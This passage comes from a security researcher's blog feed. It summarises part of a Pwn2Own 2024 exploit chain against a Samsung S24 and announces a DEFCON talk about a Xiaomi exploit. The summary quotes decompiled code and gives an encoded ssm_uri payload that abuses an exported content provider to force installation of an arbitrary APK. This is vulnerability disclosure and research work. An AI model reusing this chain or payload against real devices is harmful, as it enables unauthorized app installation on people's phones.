android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation"&gt; &lt;intent-filter&gt; &lt;action android:name="com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH"/&gt; &lt;category android:name="android.intent.category.DEFAULT"/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; SsmUpdateCheckActivity first checks that the incoming Intent contains a specific Action, and assigns the Intent String extra “MODE” to the static String variable r. If the Action value does not match a specific value, then the Activity finishes. public class SsmUpdateCheckActivity extends p { ... public final void onCreate(Bundle bundle) { ... Intent intent = getIntent(); if (intent == null) { finish(); } else { this.q = intent.getAction(); this.r = intent.getStringExtra("MODE"); if (!"com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH".equals(this.q)) { Log.w("[SmartSwitchAgent]SsmUpdateCheckActivity", "Undefined action! - " + this.q); finish(); ... Continuing down SsmUpdateCheckActivity, a new Intent object is created and the target Component value is dependent on the value of the String extra “MODE”. For our exploit chain, our “MODE” value is set to “DIALOG”, which will set the Intent object’s Component to com.sec.android.easyMover.Agent.ui.SsmUpdatePkgDialog. All of the incoming Intent’s extras are added to the newly created Intent object. Then startActivity(Intent) is executed against the newly created Intent object. public class SsmUpdateCheckActivity extends p { ... public final void onResume() { ... if ("DIALOG".equals(this.r)) { Intent yayintentyay = new Intent(this.o, (Class&lt;?&gt;) SsmUpdatePkgDialog.class); yayintentyay.setAction(getIntent().getAction()); yayintentyay.replaceExtras(getIntent()); yayintentyay.addFlags(33554432); startActivity(yayintentyay); finish(); return; } When SsmUpdatePkgDialog receives the Intent object, it passes the object to class s4.c and sets some static variables based on the Intent object’s extras. Two of these parameters are of interest: • ssm_action which is saved to the static variable j • ssm_uri which is saved to the static variable k public class SsmUpdatePkgDialog extends n { ... public final void onCreate(Bundle bundle0) { ... this.q = new c(this.getIntent()); ... public final class c { ... public c(Intent intent) { ... this.j = intent.getStringExtra("ssm_action"); this.k = intent.getStringExtra("ssm_uri"); ... The ssm_uri value / static k variable is then read by class l.n3 method run() and passes the value to class l4.u method g(String, String). From there, the value is passed to class s4.a method k(Context, String, String, b). public final class n3 implements Runnable { ... public final void run() { ... case 7: SsmUpdatePkgActivity ssmUpdatePkgActivity = (SsmUpdatePkgActivity) obj; ... StringBuilder sb = new StringBuilder(); sb.append(ssmUpdatePkgActivity.o.getFilesDir()); ssmUpdatePkgActivity.p.g(o2.e(sb, File.separator, "SmartSwitchMobile.apk"), ssmUpdatePkgActivity.q.k); public final class u { ... public final void g(String yaydestinationyay, String yayssmuriyay) { ... if (!a.k(this.m, yaydestinationyay, yayssmuriyay, new b(this))) { ... In class s4.a method k(Context, String, String, b), the Easy Mover Agent application will try to reach out to the URI defined by ssm_uri via context.getContentResolver().openInputStream(Uri). If the open is successful, then Easy Mover Agent will attempt to download/copy the file to Easy Mover Agent’s internal files directory as the file “SmartSwitchMobile.apk”. public abstract class a { ... public static boolean k(Context context0, String yaydestinationyay, String yayssmuriyay, b b0) { ... InputStream inputStream0; ... Uri yayuriyay = Uri.parse(yayssmuriyay); ... try { bufferedInputStream0 = null; inputStream0 = context0.getContentResolver().openInputStream(yayuriyay); } ... After the file is downloaded and saved as “SmartSwitchMobile.apk”, Easy Mover Agent will automatically attempt to install the saved .apk file. After the application is installed, Easy Mover Agent will create a new Intent object with an Action value set by ssm_action / static variable j. Easy Mover Agent will then run startActivity(Intent) against this Intent object. public final class c { ... public final Intent a(Context context) { ... String yayactionyay = this.j; return TextUtils.isEmpty(yayactionyay) ? context.getPackageManager().getLaunchIntentForPackage("com.sec.android.easyMover") : new Intent(yayactionyay); } BUG 5 – Easy Mover Agent does not check the validity of “SmartSwitchMobile.apk” before installing the .apk file Based on the name of the saved file, it can be deduced that the application expects a specific application developed by Samsung. If so, then the application should be checking if the .apk file is signed by Samsung’s certificate. Without this check, it is possible to force Easy Mover Agent to install any .apk file saved to the Android device. At this point in our exploit chain, the Drozer .apk file should be downloaded to /storage/emulated/0/GPUWatch_Dump/html/. However, Easy Mover Agent does not have access to the /storage/emulated/0 directory since it lacks the proper Android permissions. However, the application GPUWatch (com.samsung.gpuwatchapp version 2.1.2) contains an exported Content Provider that allows applications to download files from the directory /storage/emulated/0/GPUWatch_Dump/html/. So to force Easy Mover Agent to install the Drozer .apk file, the URI passed to SsmUpdateCheckActivity must be set to GPUWatch’s Content Provider. ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b Decoded: ssm_uri=content://com.samsung.gpuwatchapp.HtmlDumpProvider/yay.apk After Drozer is launched, Drozer can be launched via one of the following methods: Set ssm_action to an Action value that is registered by Drozer For our exploit chain, we will not be using this method since Drozer does not register a unique Action value Creating a new Drozer .apk requires Google Play to scan the app before it can be installed on the Samsung device I’m writing this whitepaper 4 days before the Pwn2Own entry is due, and I don’t want to risk pissing off Google Play Use Gaming Hub to launch Drozer via new Intent This is the method we use in our exploit chain]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://maliciouserection.com/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/cover-page.png" /><media:content medium="image" url="https://maliciouserection.com/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/cover-page.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Ken is talking at DEFCON 32</title><link href="https://maliciouserection.com/2024/07/15/talking-at-defcon-32.html" rel="alternate" type="text/html" title="Ken is talking at DEFCON 32" /><published>2024-07-15T00:00:00+00:00</published><updated>2024-07-15T00:00:00+00:00</updated><id>https://maliciouserection.com/2024/07/15/talking-at-defcon-32</id><content type="html" xml:base="https://maliciouserection.com/2024/07/15/talking-at-defcon-32.html"><![CDATA[<p>Ken Gannon, the CEO of Malicious Erection LLC, is talking at DEFCON 32!</p>

<p><a href="https://defcon.org/html/defcon-32/dc-32-speakers.html#54454">https://defcon.org/html/defcon-32/dc-32-speakers.html#54454</a></p>

<p>“At Pwn2Own Toronto 2023, NCC Group was one of the two teams that compromised the Xiaomi 13 Pro. The exploit chain involved using a malicious HTML hyperlink and uploading a potentially malicious application to the Xiaomi app store.</p>

<p>However, this talk is not just about the technical details of the exploit. While researching the final exploit, NCC Group discovered how an exploit could work in one region of the world, but not in other regions, and how the researchers had to travel to Canada for a day just to test if the exploit would work in Canada. This talk also discusses just how far Xiaomi is willing to go to make sure their device isn’t hacked at Pwn2Own, and why only two teams were able to successfully compromise the device during the competition.”</p>

<p>When: 9 August 2024, 13:30 Las Vegas time 
Where: LVCC - L3 - W322-W327 (Warstories Track)</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Ken Gannon, the CEO of Malicious Erection LLC, is talking at DEFCON 32!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://maliciouserection.com/assets/images/blog/2024-07-15-talking-at-defcon-32/xiaomi-the-money.png" /><media:content medium="image" url="https://maliciouserection.com/assets/images/blog/2024-07-15-talking-at-defcon-32/xiaomi-the-money.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>